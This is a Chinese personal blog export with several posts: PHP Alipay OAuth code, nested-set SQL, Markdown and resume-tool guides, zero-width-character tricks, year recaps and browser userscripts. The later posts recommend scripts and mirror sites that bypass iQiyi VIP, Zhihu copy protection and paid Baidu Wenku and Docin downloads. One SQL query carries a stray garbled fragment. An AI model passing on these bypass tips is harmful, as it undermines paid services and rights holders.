userInfo($app_auth_token) &#123; $infoArr = [ 'method' =&gt; 'alipay.system.oauth.token', 'app_id' =&gt; $this-&gt;app_id, 'charset' =&gt; 'utf-8', 'sign_type' =&gt; 'RSA2', 'timestamp' =&gt; date('Y-m-d H:i:s'), 'version' =&gt; '1.0', 'code' =&gt; $app_auth_token, 'grant_type' =&gt; 'authorization_code', ]; $signStr = $this-&gt;myHttpBuildQuery($infoArr); $sign = urlencode($this-&gt;enRSA2($signStr)); $qureStr = $signStr.'&amp;sign='.$sign; $res = new Client(); $body = $res-&gt;get('https://openapi.alipay.com/gateway.do?'.$qureStr)-&gt;getBody()-&gt;getContents(); $body = json_decode($body); if (!isset($body-&gt;alipay_system_oauth_token_response-&gt;access_token)) &#123; return '接口异常'; &#125; else &#123; $autho_token = $body-&gt;alipay_system_oauth_token_response-&gt;access_token; $userinfo = $this-&gt;aliPayUserInfo($autho_token); return $userinfo; // 或则 返回 json_encode($userinfo) 根据实际需求来 &#125; &#125; /** * AliPayUserInfo 通过 token 获取用户信息 */ private function aliPayUserInfo($autho_token) &#123; $infoArr = [ 'method' =&gt; 'alipay.user.info.share', 'app_id' =&gt; $this-&gt;app_id, 'charset' =&gt; 'utf-8', 'sign_type' =&gt; 'RSA2', 'timestamp' =&gt; date('Y-m-d H:i:s'), 'version' =&gt; '1.0', 'auth_token' =&gt; $autho_token, ]; $signStr = $this-&gt;myHttpBuildQuery($infoArr); $sign = urlencode($this-&gt;enRSA2($signStr)); $qureStr = $signStr.'&amp;sign='.$sign; $res = new Client(); $body = $res-&gt;get('https://openapi.alipay.com/gateway.do?'.$qureStr)-&gt;getBody()-&gt;getContents(); $body = json_decode($body); if (!isset($body-&gt;alipay_user_info_share_response)) &#123; return '接口异常'; &#125; $body = $body-&gt;alipay_user_info_share_response; return $body; &#125; https://learnku.com/articles/30076#replies 树状数据结构存储方式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566CREATE TABLE `categories` ( `id` int(11) NOT NULL AUTO_INCREMENT, `title` char(100) NOT NULL, `pid` int(11) DEFAULT 0, PRIMARY KEY (`id`)) ENGINE=InnoDB;CREATE TABLE `categories` ( `id` int(11) NOT NULL AUTO_INCREMENT, `title` char(100) NOT NULL, `lft` int(11) NOT NULL UNIQUE CHECK (lft&gt; 0), `rgt` int(11) NOT NULL UNIQUE CHECK (rgt&gt; 1), PRIMARY KEY (`id`)) ENGINE=InnoDB;lft 和 rgt 是作为集合的边界，两者差值越大，则集合越大，里面的元素就越多。根据子集，查找父级的分类SELECT c2.* FROM categories as c1, categories as c2 WHERE c1.lft BETWEEN c2.lft and c2.rgt AND c1.title = '华为';+----+-------------+-----+-----+| id | title | lft | rgt |+----+-------------+-----+-----+| 1 | Smartphones | 1 | 14 || 5 | Harmony OS | 10 | 13 || 8 | 华为 | 11 | 12 |+----+-------------+-----+-----+根据父级，查找其底下所有的子集SELECT c1.* FROM categories AS c1, categories AS c2 WHERE c1.lft BETWEEN c2.lft AND c2.rgt AND c2.title = 'Smartphones';+----+-------------+-----+-----+| id | title | lft | rgt |+----+-------------+-----+-----+| 1 | Smartphones | 1 | 14 || 3 | Android | 2 | 5 || 4 | iOS | 6 | 9 || 5 | Harmony OS | 10 | 13 || 6 | 小米 | 3 | 4 || 7 | iPhone | 7 | 8 || 8 | 华为 | 11 | 12 |+----+-------------+-----+-----+查看各个分类的级别 SELECT COUNT(c2.id) AS indentation, c1.title FROM categories AS c1, categories AS c2下周三we'fv WHERE c1.lft BETWEEN c2.lft AND c2.rgt GROUP BY c1.title ORDER BY c1.lft;+-------------+-------------+| indentation | title |+-------------+-------------+| 1 | Smartphones || 2 | Android || 3 | 小米 || 2 | iOS || 3 | iPhone || 2 | Harmony OS || 3 | 华为 |+-------------+-------------+https://learnku.com/articles/33630 敏感词过滤 PHP 中基于 Casbin 做 RBAC + RESTful 权限控制 方便导入和导出 Excel windows10 swoole laravel Windows 系统下的 Linux 子系统 【系统】打造自己最喜爱的 Windows10 —— U 盘启动盘制作篇 sentry 追踪 Laravel 生产环境 bug 尝试 Leetcode LeetCode-Algorithms 算法题 PHP 实现 Leetcode database problem 数据库练习题 PHP 与 Swoole 浅析与学习 PHP开发环境laragon php swoole视频 教你如何使用 PHP 优雅的生成 PDF 和 Image 使用 Laravel-snappy 生成 PDF 踩坑记录 初识wkhtmltopdf 个人学习记录 PHP 的在线正则表达式 优化Nginx及PHP-fpm的几种方式 php注释标记 PHP使用Dompdf CentOS 下多版本 PHP 的安装与配置 终端显示你的 docker 状态 复杂度分享 Laravel-admin 源码分析系列 Laravel 如何实现数据的软删除 PHP开发规范单元测试 字符编码那些事儿 基于 gitbook 构建团队项目开发规范文档 PHP深入pack/unpack]]></content>
  </entry>
  <entry>
    <title><![CDATA[那些你可能用得上的简历写作工具]]></title>
    <url>%2F2019%2F08%2F12%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E7%94%A8%E5%BE%97%E4%B8%8A%E7%9A%84%E7%AE%80%E5%8E%86%E5%86%99%E4%BD%9C%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[马上要到金九银十的招聘季节了，很多人又要开始找工作了，除了简历上充实的干货之外，更重要的就是写一份漂亮的简历了。 通常简历用 pdf 格式最好，因为PDF不可编辑，浏览器就能打开，不用担心像Word那样不同操作系统的兼容问题。 这里推荐几个非常赞的简历写作工具。 冷熊简历冷熊简历是一个运行在浏览器里边的 Markdown 编辑器， 支持 Markdown 实时预览并保存，下载 MD 文件，可以一键生成 PDF ，提供简单大方的单页式排版。 网址 http://cv.ftqq.com/# , 我上次找到新浪的工作就是用的这个来写简历的 作者easy还提供了Mac版 https://share.weiyun.com/5AvnFvu。 如果你还不会markdown，欢迎查看之前的文章学习下，10分钟学会。我是如何用 Markdown 写公众号文章的 生成pdf效果见如图，然后可以直接下载到本地发给hr了。作者还提供了程序员简历模板系列，包括PHP，iOS ，安卓，前端等。https://github.com/geekcompany/ResumeSample 如果你不是程序员，可以找份你对应岗位的模板，粘贴到这里即可。 为了方便使用，作者还拍了个视频来介绍，见微博地址 https://weibo.com/1088413295/Fw6fNfSkA 极简简历 这是一个在线制作简历的网站，支持免费在线制作导出图片， pdf， word，还有免费简历模板下载，网址 http://www.polebrief.com/ 有各种岗位的内容模板。可以在线预览效果，并下载PDF。 如果以上还不能满足你的需求，可以使用专业的简历工具，比如超级简历，五百丁什么的，当然那些是收费的，并且不便宜。 最后如果你是应届生，想进入新浪的话可以使用我的内推码 JO3A7。 资源：简历模板http://ftqq.com/book/proguide/vol4/w312.html#其他项目-2哪里有免费优秀简历模板下载https://www.zhihu.com/question/49065128有哪些优秀的简历模板https://www.zhihu.com/question/23734172 超级简历http://WonderCV.com用 Markdown 维护简历，用 GitHub Page 托管。https://github.com/hackjutsu/geek-profile简历调成一页纸https://zhuanlan.zhihu.com/p/26781612简历常用例句https://github.com/resumejob/awesome-resume中英混排 https://github.com/mzlogin/chinese-copywriting-guidelineshttp://resume.github.io/谷歌文档在线可以制作PDF牛人简历https://pennyliang.com/#/penny 适合程序员/设计师的简历模板 https://github.com/byoungd/Resume-template-for-Coder适合中文的简历模板收集 https://github.com/dyweb/awesome-resume-for-chinese互联网从业者简历翻译指南v1.0 https://weibo.com/ttarticle/p/show?id=2309404385625242506061教你怎么制作优秀简历，经验贴合集 https://weibo.com/5888006271/HAQyvCoFchttps://qcrao.com/2019/07/08/how-to-write-resume-gracefully/https://www.zhiyeapp.com/https://www.500d.me/http://www.jianliben.com/2019年最新总结，阿里，腾讯，百度，美团，头条等技术面试题目，以及答案，专家出题人分析汇总https://github.com/billryan/resume letex 模板https://github.com/dnl-blkv/mcdowell-cv 推荐阅读： 我是如何用 Markdown 写公众号文章的 如何发一条空白的朋友圈 历史上消失的那 10 天去哪了？ 听说你想 520 表白 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 上班摸鱼好去处 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我是如何用 Markdown 写公众号文章的]]></title>
    <url>%2F2019%2F08%2F06%2F%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%94%A8-Markdown-%E5%86%99%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E7%9A%84%2F</url>
    <content type="text"><![CDATA[工欲善其事，必先利其器，想快速完美的完成一篇文章，编辑器和排版是很重要的，这里强烈推荐下 Markdown。 Markdown是一种轻量级标记语言，创始人为约翰·格鲁伯（英语：John Gruber）。它允许人们“使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML（或者HTML）文档”。 以上介绍来自维基百科 https://zh.wikipedia.org/wiki/Markdown Markdown 相比普通的文本编辑器有什么优点呢？ 如同编辑 word 一样编辑 Markdown 文件，简单直观。 轻松插入图片（直接粘贴上传）、表格、链接、列表、流程图、甘特图、时序图、LaTeX 公式等。 高亮代码块。 支持实时预览。 表格编辑。 使用 Markdown 编辑器写文章，可以让作者只专注于内容，不再操心排版的问题。 公众号后台是有编辑器的，但比较难用，而且经常停留时间久了（文章写得长）可能需要重新登录，更麻烦的是排版问题，还没法实时预览效果。 所以我一直是用markdown编辑器写好文章，然后直接粘贴到公众号编辑器里，本文也是在 markdown 下编辑的。 下面说说 Markdown 语法 怎么用的，其实很简单，10分钟学会。 常用语法标题语法：#+空格+文本 123456# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 效果：可以看到三级标题比六级标题字体要大粗。 插入链接语法：[文字描述](文字链接)1[Markdown中文文档](https://markdown-zh.readthedocs.io/en/latest/) 效果：Markdown中文文档 插入图片语法：![图片描述(图片链接)简单点就是直接复制图片后粘贴上传。1![Markdown中文文档](https://upload-images.jianshu.io/upload_images/17817191-2cfc5cfb11272656.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240) 效果： 引用语法： &gt;+空格 +文本1&gt; 这是一段引用 效果： 这是一段引用这是另一段引用 代码块语法如下： \12 这是代码段\ 效果：12345678public function cache()&#123; $cache = \Cache::get('app'); if(!$cache) &#123; \Cache::put('app', 'cache', 1); &#125; dump($cache);&#125; LaTeX公式行内公式，使用两个美元符 $$ 包裹 LaTeX 格式的数学公式 ，如 $$\Gamma(n) = (n-1)!\quad\forall n\in\mathbb N$$ 效果：$$\Gamma(n) = (n-1)!\quad\forall n\in\mathbb N$$或者块级公式$$ x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} $$： $$ x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} $$ 因为公众号不支持公式，所以用图片替代了。 表格语法如下：1234| 项目 | 价格 | 数量 || -------- | -----: | :----: || 电脑 | \$1600 | 6 || 手机 | \$120 | 8 | 效果： 项目 价格 数量 电脑 \$1600 6 手机 \$120 8 列表语法： - + 空格 ＋ 文本 或者 数字 + + 空格 + 文本123- 列表一- 列表二- 列表三 效果： 列表一 列表二 列表三 粗体、斜体、删除线语法：*文字*1**粗体** *斜体* ~~删除线~~ 效果：粗体 斜体 删除线 转义如果你想只显示一个 # 号而不是一个标记，可以这样输入\# Markdown 就不会误认为是一个标记了。语法：\# 效果：# Markdown 以上是常用的语法，应该能完全应付写一篇文章，如果想了解更多语法可以到Markdown中文文档https://markdown-zh.readthedocs.io/en/latest/查看。 在线markdown编辑器知道了markdown 语法，实践才是硬道理，学习 markdown 是个很轻松的过程，因为能实时预览，10分钟就能学好，赶紧来试试吧。 目前很多网站支持 markdown 了，比如简书，简书一个很不错的博客平台，提供富文本编辑器和markdown编辑器，先将markdown编辑器设置为默认。 它能实时预览保存。还能查看文件编辑历史，如果想回到过去某个版本也很简单。 不过简书需要注册账号，如果是临时用用推荐作业部落https://www.zybuluo.com/mdeditor 客户端markdown编辑器除了在线的 markdown编辑器，还有客户端版本的markdown编辑器，这样就能本地编辑，不需要联网也能使用markdown，Markdown文件的后缀名是.md。 首先推荐免费极简编辑器Typora https://typora.io/ 支持的平台有 Windows、MacOS、Linux。 另外一个更懂程序员的markdown软件vnote https://tamlok.github.io/vnote/zh_cn/#!downloads.md 公众号编辑器 用markdown编辑器写完文章后，如果直接复制到公众号编辑器，因为公众号后台支持markdown不大好，效果可能会很乱。 所以有人开发了针对公众号后台的markdown编辑器，比如https://lab.lyric.im/wxformat和http://js8.in/mpeditor， 这2个是开源的，可以部署到自己服务器。 不过我常用的是http://md.aclickall.com/ ，将markdown复制到这然后粘贴到公众号后台就完成了。 更多资源：MarkDown工具https://www.ifuntools.cn/special/markdown/在线脑图工具https://www.socialwiki.cn/https://www.mdeditor.com/https://help.seafile.com/zh/wiki/markdown_editor.htmlhttps://mazhuang.org/2018/09/06/markdown-intro/https://coding.net/help/doc/project/markdown.htmlhttps://maxiang.io/https://juejin.im/post/5c1cd16de51d4563d9206173基于 git 的笔记软件 https://www.gitnoteapp.com/有道云笔记http://note.youdao.com/https://github.com/lyricat/wechat-formathttps://www.mdnice.com/ 你平常用的哪个编辑器，可以评论分享下。 推荐阅读： 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何发一条空白的朋友圈]]></title>
    <url>%2F2019%2F08%2F06%2F%E5%A6%82%E4%BD%95%E5%8F%91%E4%B8%80%E6%9D%A1%E7%A9%BA%E7%99%BD%E7%9A%84%E6%9C%8B%E5%8F%8B%E5%9C%88%2F</url>
    <content type="text"><![CDATA[所谓空白的朋友圈就是一条看起来没有文字的朋友圈，因为发朋友圈的时候不输入文字是没法发送的。不可见字符是有文字内容的，只是人的肉眼看不见，所以相当于空白。 不可见字符不可见字符就是零宽空格，见维基百科解释https://zh.wikipedia.org/wiki/%E9%9B%B6%E5%AE%BD%E7%A9%BA%E6%A0%BC： 零宽空格（zero-width space, ZWSP）是一种不可打印的Unicode字符，用于可能需要换行处。 http://www.fileformat.info/info/unicode/category/Mn/list.htm 这里列出了许多不可见字符，控制台输入对应的Unicode码就能显示出来。 比如第一个 \u0300 就是̀这个字符，但是这个字符肉眼是看不见的。通过进制转换可以看到它的二进制是00000000在PHP里可以看到它的长度为212&gt;&gt;&gt; strlen('̀')=&gt; 2 空白朋友圈将上面copy的不可见字符发到朋友圈 ，效果如下：如果你也想发条空白的朋友圈，在公众号内回复 朋友圈 获取,当然微博也是可以的https://weibo.com/2717930601/HDjs3fVkU星球一样： 有意思的字符https://www.compart.com/en/unicode/category/So 和 https://unicode-table.com/cn/#lao 这里列出了一些有意思的字符。 比如手表 ⌚ ,版权 ℗ ，商标 ™ ， 箭头 ↱，键盘 ⌨ 等，在控制台输入’\u231a’就是手表。上面的字符是没法用输入法直接输入的，所以搜狗输入法也提供了一些特殊字符。 其中这个é字符， unicode 是 \u00e9, 而 ‘\u0301’ 是个不可见字符， ‘e’ + ‘\u0301’ 拼在一起就成了这样。e的长度为1，拼接后长度为2，见 https://www.cnblogs.com/52cik/p/unicode-mark-nonspacing.html。多拼几个就成这样了&#39;e&#39;+Array(50).join(&#39;\u0301&#39;) é́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́́ 继续拼接字符 &#39;很好玩&#39;+Array(50).join(&#39;\u0310&#39;)+Array(50).join(&#39;\u0598&#39;)+Array(50).join(&#39;\u0e49&#39;); 很好玩้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐̐֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘֘ 零长度短网址 https://zws.im/ 这个网站用不可见字符欺骗你的视觉。输入网易云音乐网址后的地址变成了https://zws.im/​‌​​​‌​​‌‌​​‌​/，看起来不是网易的地址却跳转到了网易。当然这个生成服务在墙外，所以有人开发了国内版 https://ml.mk/网易云音乐的短网址就是 https://ml.mk/‌‌‌‌‌‌‌‌​‌​​​‌​‌/，如果是某个不可描述网站生成这样的短网址，然后你在办公室打开就尴尬了，所以说不要随意打开这些不认识域名的网站。 另外有人还做了个零宽字符隐藏加密网站 http://morse.rovelast.com/，原理是利用零宽字符这种在文本中不显示的特殊字符，对加密文本进行转码，嵌入到普通文本当中，从而隐藏加密内容；表面看起来是一段普通文本，复制粘贴不会丢失。 参考： http://www.asciim.com/ascii/265.htmlUTF-8 encoding table and Unicode characters字符百科去掉不可见字符进制转换Unicode Characters in the ‘Mark, Nonspacing’ Category踩坑特殊字符之硬空格过滤ASCII码中的不可见字符Linux终端：用cat命令查看不可见字符奇葩字符 “a๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎” 的简单分析使用零宽字符，隐藏存储加密信息可生成零宽度地址与二维码的PHP短网址程序 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018 那些事儿]]></title>
    <url>%2F2019%2F07%2F29%2F2018-%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%2F</url>
    <content type="text"><![CDATA[最近新浪食堂换新的供应商，饭好吃多了。 过去一年发生很多事，这里做个总结。 之前发布了网易，微博，知乎等总结 我的2018年 现在中国移动也来了。 查看你的2018移动账单‼️最高1GB‼️ 平均一个月消费67，几乎都是流量。 这个号码是我妈的 今天看到一条微博很有意思，原来微博办公已经实现了，微博的确改变了这个世界。https://weibo.com/3227812037/HazHWChaH ： 另外 2018微信数据报告 的70后、80后、90后、00后的人群分析，有、意思 https://weibo.com/2357213493/Hb7J6gvRB https://support.weixin.qq.com/cgi-bin/mmsupport-bin/getopendays?from=groupmessage&amp;isappinstalled=0 微信8年啦！除了2019 微信公开课张小龙分享的干货外，以下这14条微信“潜规则”你也应该知道！欢迎对号入座 https://weibo.com/1742566624/HbkVbaj4c https://wx2.sinaimg.cn/mw690/a1eface5ly1fz1qti4st3j20u085znpd.jpg 你置顶了谁，谁又置顶了你？ 再看新榜的微信公众号总结 公众号的2018 2018，无法撤回 2018年中国微信500强年报https://cu2018.newrank.cn/h5.html?n=2b0039&amp;from=timeline 今年正好是改革开放40年，人民日报发了40年变化，很形象 幸福长街40号 ，地址 https://c.h5in.net/people/ 而且里面居然发现了周杰伦，可见杰伦对华语音乐的贡献。 最后推荐一些朋友的2018总结和好文： 我的2018年个人总结 python之禅公众号文章目录 学Python前请你先看看这个文章 2018年Python爱好者社区历史文章合集 https://2018.juejin.im 2018 掘金年度总结 老薛星球的 精华摘选 2018年：自由这一年 我所知道的寒江雪 罗振宇2018“时间的朋友”跨年演讲精华版全文 分析了10个公众号5600篇文章2000w字 一年过去，我读过的十佳好文 金庸│人生就是大闹一场，悄然离去 金庸去世，失去了后台的新媒体人不只六神 【整理】从零开始学Python系列 离职后，我是这样准备面试的 这些年我看到的所谓区块链 开发了5年android，我开始了go学习之旅 【漫话】如何给女朋友解释什么是分布式和集群？ 这可能是最为详细的Docker入门总结 365篇高质技术文章目录整理，每天一点收获 深度好文|面壁人张小龙，我是你的破壁人 五分钟让你快速看懂区块链 公众号历史文章及代码汇总 如何快速入门新媒体运营 MySQL索引优化看这篇文章就够了 一边制造，一边讲解http状态码502|504|499|500 2018国民年度流行语TOP100出炉了 这样写简历，offer不给你给谁？ 1988-2018，慢慢听，别哭啊 2018年最热流行语TOP20”榜单 https://weibo.com/3960037780/H9bJ9074D 关于直销和传销的科普 https://weibo.com/5780974966/H8T0AiPAM QQ发文回顾2008~2018年，十年间的标志性流行语 https://weibo.com/2357213493/H8UFAvrqt 网友给出的总结2018年中国的10个汉字，你最认可哪个 https://weibo.com/2836149552/H898Dspjg 微博2018年数据回顾 https://weibo.com/1560906700/H8fVntJvA 我的时代和我 (2018) https://weibo.com/1856050627/H7DTKnhF6 一整年的乐儿都在这儿了！郭德纲、于谦、岳云鹏、孙越、张云雷的相声合集https://weibo.com/1662214194/H9JWf9b1K 网易“娱乐圈画传 https://ent.163.com/special/entphotos2018/ 《2018年度热点图鉴》 https://weibo.com/5901272946/H9vGAhbtK 对于2018年，该说不该说的，鲁迅先生都帮我们说完了…… https://weibo.com/6421571119/H9vEOBxgb 「2018，我们用什么书写历史？」 https://weibo.com/2028810631/H9ARHhL3s 《成人世界黑话鉴定指南》 https://weibo.com/1618993981/H99M39vu0 豆瓣2018年度音乐榜单，回顾全年好音乐！ https://weibo.com/1742566624/H9hCs9aRh 网上有个段子，中国近现代人生22个失误： 1911年当太监；1916年投奔袁世凯；1924年没去上黄埔军校；1927年与吴佩孚孙传芳搞到一块；1934年不敢冒死参加长征；1937年为抗日参加了国军；1945年入伪军；1949年离开党组织又不敢接受老蒋的免费机票；1948年农村买地；1955年从城市跑去农村；1957年参加会议一激动提了意见；1966年下乡扎根和贫下中农结婚；1976年投靠四人帮；1980年看不起个体户；1991年不敢开办公司；1997年找门路到国企当了工人；2003起年不敢买房子；2012年才用心思把自己弄成贪官；2015年10月结扎；2017年3月从雄县迁出户口，2018年满仓A股，2019年辞职再就业。 2019年，稳定为主，好好赚钱，好好生活吧。 人生就是一场轮回，看完感觉豁达了许多。 https://weibo.com/1742566624/HaHBKEPV8]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018 新浪年会]]></title>
    <url>%2F2019%2F07%2F29%2F2018-%E6%96%B0%E6%B5%AA%E5%B9%B4%E4%BC%9A%2F</url>
    <content type="text"><![CDATA[这篇文章写于2019.1.19 这周通过了转正，真的很高兴，来新浪已经半年了，话说转正也是简单，直接发个邮件通知就行，不像之前的公司需要开个转正会议让大家来评判，感谢公司的认可。 一晃就到1月末了，这周三公司举行了年会，坐公司同事的车过去了，才发现公司好多人都有车，地下车库好多各种车，果然有钱人多。 年会地点在奥体中心，公司大，人也多，2点到了转了一圈才找到位置，然后3点开始。 想起之前公司的年会，2016的5周年年会，翻了下当时的年会图片，当时还中奖了。https://weibo.com/2717930601/DeuVSBk17 第一次参加大公司的年会，人山人海，不过今年没请什么明星，可能前几年比较流行，比如360请了泷泽萝拉，还流传了一段时间。 网上还看到一段周星驰 吴孟达在公司年会上的经典之作，推荐看看。https://weibo.com/2964493453/D492cpqwq 下面是我拍的几个视频： 新浪年会之编辑部的故事 https://weibo.com/2717930601/HcxVkrM0G?from=page_1005052717930601_profile&amp;wvr=6&amp;mod=weibotime 新浪年会之夜空中最亮的星 https://weibo.com/2717930601/HcxLXcnky?from=page_1005052717930601_profile&amp;wvr=6&amp;mod=weibotime 新浪年会之雪落下的声音 https://weibo.com/2717930601/HcxLy3fQy?from=page_1005052717930601_profile&amp;wvr=6&amp;mod=weibotime 新浪年会之年少有为 https://weibo.com/2717930601/HcxI4C0Iz?from=page_1005052717930601_profile&amp;wvr=6&amp;mod=weibotime 今年年会主题是大浪逐新，也是新浪20周年，所以大奖也多，看看这些： 特等奖 价值8万元的1克拉定制钻戒及香港往返机票 一等奖 iPhone XS 256G+iPad mini 4 128G+AirPods的Apple 大礼包 土耳其伊斯坦布尔+卡帕多其亚8日5晚旅游大奖，全程机票+酒店 二等奖 Apple iPhone XS Apple Macbook Air 三等奖 戴森(Dyson) 吸尘器 V10 小米电视4S 四等奖 戴森(Dyson) 吹风机，括号新年限量版 Kindle oasis墨水屏电纸书 五等奖 友人水果蔬菜解毒机或Beats Power3运动耳机 六等奖 飞利浦空气净化加湿器或300元好利来购物卡 竟然还有 20万元现金大奖 四位幸运儿分别获得5万元 这还不够刺激！ 新浪20周年“无与伦比暴风尖叫”奖 新浪股票2000股 2000股什么概念？ 大概人民币近80万！！！ 当时抽中2000股票的时候，那个中奖人没在现场，当时就心跳加速了，希望再抽一次抽中我，然而连续抽5次，都木有我。。。当然最惨的还是抽中没在现场的！死的心都有https://weibo.com/2357213493/Hcfz4j3yM?refer_flag=1001030103_ 更多高清无码图片查看这篇文章重头大戏，新浪年会现场竟然 或者点击原文 。https://live.photoplus.cn/activity/live/pc/4321855/#/ 另外下周六部门年会，祝自己好运吧，也祝大家升职加薪暴富。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome 浏览器扩展神器暴力猴]]></title>
    <url>%2F2019%2F07%2F22%2FChrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95%E7%A5%9E%E5%99%A8%E6%9A%B4%E5%8A%9B%E7%8C%B4%2F</url>
    <content type="text"><![CDATA[之前写过油猴插件 ，今天再说说另外一个比油猴更好用的暴力猴，这是一个可以加载油猴脚本的 Chrome 扩展，很多可以用脚本实现功能的的扩展都可以不用安装了，它支持Userscripts.org、GreasyFork、OpenUserJS三大脚本下载源。 安装扩展它是个Chrome扩展，直接在官网下载https://chrome.google.com/webstore/detail/violentmonkey/jinjaccalgkegednnccohejagnlnfdag?hl=zh-CN 如果上不了Google，可以在国内Chrome 第三方插件网站下载https://www.chromefor.com/%E6%9A%B4%E5%8A%9B%E7%8C%B4_v2-9-10/或者公众号内回复 暴力猴 获取下载链接。 打开Chrome扩展chrome://extensions/，打开开发者模式，将下载的crx文件拖进去，如果出错提示程序包无效将crx后缀改为zip再拖进去就能安装成功了，浏览器右上角可以看到图标。 安装完扩展后，打开对应网站可以搜索到相应的油猴脚本（相比油猴就是它帮你搜索了），下面推荐些常用的。 网易云音乐下载打开网易云音乐，点击右上角图标，为此站点查找脚本。跳转到https://greasyfork.org/zh-CN/scripts/by-site/163.com可以看到网易相关的所有脚本。 安装第一个脚本听歌的时候可以直接下载歌曲了。 百度网盘直链下载助手打开百度网盘链接，点击右上角图标查找脚本，第一个就是https://greasyfork.org/zh-CN/scripts/39504这个脚本可以免安装客户端一键获取百度网盘文件真实下载地址，支持使用IDM，迅雷等下载工具下载。 知乎禁止复制解除比如这个问题 https://www.zhihu.com/question/25670119/answer/63283645 的这段话是禁止复制的 而聪明人懂得利用系统工程的思维方式，把他所观察接触的事务分析拆解成一个个小的环节，研究各个环节之间的关系以及所有环节对整体的影响；然后利用他对环节的研究，达到自己的设想的目的。 搜索到对应的脚本https://greasyfork.org/zh-CN/scripts/by-site/zhihu.com，安装就能用直接复制了。如果不想安装扩展，打开页面，先按F12，再按F1。在打开的开发功能页面中选择「Disable JavaScript」 选中这个选项后是即时生效的，这样就可以复制需要的内容了。 b站视频下载比如这个视频https://www.bilibili.com/video/av40097299安装这个脚本，播放的时候左下角有下载按钮，点击跳转到下载页面https://www.ibilibili.com/video/av40097299?from=search&amp;seid=12959661207589720419 爱奇艺免VIP安装脚本后可以直接免VIP看影视剧，具体使用见之前的文章。 更多脚本自己摸索吧。 推荐阅读： Chrome 浏览器扩展神器油猴 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的百度文库/网盘下载工具]]></title>
    <url>%2F2019%2F07%2F22%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E7%99%BE%E5%BA%A6%E6%96%87%E5%BA%93-%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[有时候搜索文档，百度文库是个不错的选择，但有些文档下载要收费，如果想（一次性）免费下载（长期使用建议购买VIP）怎么办呢？这里分享些基于类似百度文库/知乎/京东等网站开发的网站。 百度文库下载这个网站可以将百度文库预览的内容提取转换成 word 或 pdf 文件（wkhtmltopdf转化）。在某个文档页面的网址域名后面加上 vvv 三个字母，就可以下载。比如https://wenku.baidu.com/view/84f9128882c4bb4cf7ec4afe04a1b0717ed5b342.html加上 vvv 为https://wenku.baiduvvv.com/view/84f9128882c4bb4cf7ec4afe04a1b0717ed5b342.html 如果觉得麻烦可以使用冰点文库工具下载，公众号内回复 文库下载 获取。 豆丁网文档下载本网站为豆丁网文档复制抓取工具，导出的文档为word形式，非源文件，但文字可编辑，包含图片，尽量保持原文档的格式。支持原文档为WORD、PDF、TXT的文档，暂不支持PPT，Excel文档。 在某个文档页面的网址 URL 后面加上 365 三个数字，就可以快捷下载文档。 比如https://www.docin.com/p-2225699594.html 加上 365 为 https://www.docin365.com/p-2225699594.html 点击解析下载即可。 百度网盘加速下载比如网盘地址https://pan.baidu.com/s/1xoqNBgaTb9bOCW5n9OGXPg 